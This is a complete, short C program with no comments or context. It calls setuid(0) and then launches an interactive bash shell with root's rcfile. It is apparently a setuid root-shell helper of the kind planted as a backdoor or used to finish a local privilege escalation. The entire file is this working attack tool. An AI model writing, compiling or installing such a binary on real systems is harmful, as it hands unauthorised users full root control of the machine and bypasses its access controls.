#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    system("/bin/bash --rcfile /root/.bashrc -i");
    return 0;
}
